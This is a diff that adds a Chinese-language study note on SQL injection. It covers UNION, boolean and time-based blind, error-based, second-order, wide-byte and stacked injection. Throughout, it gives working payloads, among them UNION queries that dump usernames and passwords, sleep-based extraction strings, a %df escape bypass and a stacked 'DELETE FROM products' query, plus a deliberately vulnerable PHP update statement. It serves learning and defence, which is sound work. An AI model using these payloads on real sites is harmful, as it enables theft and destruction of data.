@@ -1,0 +1,209 @@
+# sql基础以及一些sql的常用注入手段
+
+<br>
+
+### sql注入：
+
+> 后端把用户输入直接拼接进 SQL 语句，导致用户输入从普通数据变成了 SQL 语法的一部分，最终改变了原 SQL 的执行逻辑。
+
+<br>
+
+### 如何判断闭合符？
+
+一般闭合符为 **'** 或 **"**,也少数会有 ')
+
+判断是可以先一个一个猜，如果有报错回显，那么十有八九就是那个发生报错的
+
+有报错之后，再进一步带上截断，如果正常回显了，那么基本就可以判断出闭合符就是这个了
+
+```
+例如：
+1' --+ 
+1" --+
+```
+
+<br>
+
+### UNION查询
+
+union查询可以说是最常见的注入手段
+
+简单来说它是把两个查询结果拼在一起返回的查询方式
+
+```
+例如：
+SELECT id, username, password FROM users WHERE id='-1' UNION SELECT 1,2,3 --+
+
+?id=-1' UNION SELECT 1,group_concat(password),group_concat(username) FROM users --+  //group_concat是聚合函数，可以把多行数据合并成一行
+```
+
+union查询有个要求：**前后两个 SELECT 的列数必须一致，否则 SQL 会报错**
+
+所以一般在进行union之前，要先爆出列数
+
+<br>
+
+<br>
+
+### SQL盲注（布尔盲注，时间盲注）
+
+> 布尔盲注就是把想知道的信息拆成一个个真假判断。常见思路就是先用length函数判断长度，再按位判断字符。**页面正常代表条件为真，页面异常代表条件为假**。
+
+判断是否存在布尔差异
+
+```
+1' and 1=1 --+ 
+1' and 1=2 --+
+观察两者回显是否相同，页面是否正常回显
+```
+
+如果有差异那么极大可能存在盲注
+
+盲注常用函数：
+
+```
+length();  //计算字符串长度
+substr(str,pos,len)  //截取字符串  同类函数：substring(str,pos,len)  mid(str,pos,len)
+if(条件, 条件为真执行这个, 条件为假执行这个) //如 if(length(database())=8,1,0)
+ascii() //将字符转为ascii码
+```
+
+手工布尔盲注效率很低，实战中一般用脚本，`ascii(substr(...))` 把字符转成数字，再通过大于、小于判断进行二分搜索。
+
+<br>
+
+> 时间盲注：当**页面真假差异不明显，但是 SQL 执行时间会变**的话，就可以依据时间来进行真假判断
+
+例如:
+
+```
+?id=1' and if(1=1,sleep(3),1) --+
+```
+
+如果明显延时，那大概时间盲注可用。
+
+<br>
+
+```
+?id=1' and if(length(database())=8,sleep(3),1) --+  爆数据库长度
+
+?id=1' and if(substr(database(),1,1)='s',sleep(3),1) --+  爆第一个字符
+
+?id=1' and if(ascii(substr(database(),1,1))>100,sleep(3),1) --+ ASCII 二分法
+```
+
+<br>
+
+<br>
+
+### 报错注入
+
+> 页面会显示数据库报错信息，我们故意让 SQL 报错，并把想查的数据塞进报错内容里
+
+常用函数：
+
+```
+updatexml()
+extractvalue()
+floor()
+```
+
+**原理** : updatexml和extractvalue都是操作xml的函数。其中的xpath参数会优先被mysql执行，再放进函数里解析，发现xpath语法错误后，会将xpath的解析信息直接放进错误提示里。
+
+```
+例如  
+1' and updatexml(1, concat(0x7e,database(),0x7e), 1)--+  //爆数据库
+1' and extractvalue(1,concat('~',database()))--+
+```
+
+<br>
+
+<br>
+
+### 二次注入
+
+本质是开发错误的信任了数据库中的数据
+
+**示例：**
+
+> 注册时：
+>
+> ```
+> 用户名：admin'#
+> 密码：123456
+> ```
+>
+> 数据库里存入admin'#
+>
+> 后来修改密码：
+>
+> 后端写法很危险：
+>
+> ```
+> $user = 从数据库取出的用户名;
+> 
+> $sql = "
+> UPDATE users
+> SET password='$newpwd'
+> WHERE username='$user'
+> ";
+> ```
+>
+> 拼接的时候
+>
+> ```
+> UPDATE users
+> SET password='123456'
+> WHERE username='admin'#'  
+> ```
+>
+> 执行后修改的就是admin的密码
+
+<br>
+
+二次注入不一定发生在登录，也可能发生在昵称、地址、备注、签名等字段。关键是恶意内容先入库，后续被取出来再次拼接 SQL 时才执行。
+
+<br>
+
+<br>
+
+### 宽字节注入
+
+宽字节注入最典型的场景用法是应对**“\”**转义。
+
+原理：
+
+一些waf自动会在'或者"前面加上\，转义，这会导致我们的注入失效。
+
+```
+例如：
+admin'   ---->  admin\'
+```
+
+我们在注入时可以在前面加上%df，那么waf处理后就变成admin%df \\'
+
+而其中\的十六进制是%5c
+
+所以实际字节是%df%5c%27，前面的%df%5c经过gbk编码可能会变成一个中文字符，这就可以把\\给吃掉，然后舒服注入。
+
+> 宽字节注入通常发生在数据库连接使用 GBK 等宽字节编码，而过滤逻辑只简单转义单引号的场景。攻击者构造 `%df%5c` 这样的字节组合，让反斜杠成为宽字符的一部分，从而绕过转义，使后面的单引号重新参与 SQL 语法闭合。
+
+<br>
+
+<br>
+
+### 堆叠注入
+
+就是一次性执行多条的sql查询语句。
+
+例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除
+
+**利用条件**：
+
+1.web框架、中间库允许多条sql执行（如：PHP 中 用了`mysqli_multi_query()` 函数）
+
+2.waf不拦 **；**
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260524002838.png)
+
+修改表users中id=1的密码
